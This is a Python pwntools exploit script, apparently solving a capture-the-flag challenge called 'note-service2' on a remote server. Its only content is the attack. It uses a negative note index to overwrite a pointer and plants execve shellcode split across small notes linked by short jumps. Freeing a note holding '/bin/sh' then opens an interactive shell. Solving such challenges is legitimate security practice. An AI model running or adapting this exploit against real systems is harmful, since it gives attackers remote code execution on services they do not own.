from pwn import *

context(log_level="debug", arch="amd64", os="linux")
# r = process("./note-service2")
r = remote("61.147.171.105", 59707)


def add(idx: bytes, content: bytes):
    r.sendlineafter(b"your choice>> ", b"1")
    r.sendlineafter(b"index:", idx)
    r.sendlineafter(b"size:", b"8")
    r.sendlineafter(b"content", content)


def delete(idx: bytes):
    r.sendlineafter(b"your choice>> ", b"4")
    r.sendlineafter(b"index:", idx)


add(b"0", b"/bin/sh")
add(b"-17", asm("mov eax, 0x3b") + b"\xeb\x19")
add(b"1", asm("xor rsi, rsi") + b"\x90\x90\xeb\x19")
add(b"2", asm("xor rdx, rdx") + b"\x90\x90\xeb\x19")
add(b"3", asm("syscall") + b"\x90" * 5)
delete(b"0")

r.interactive()
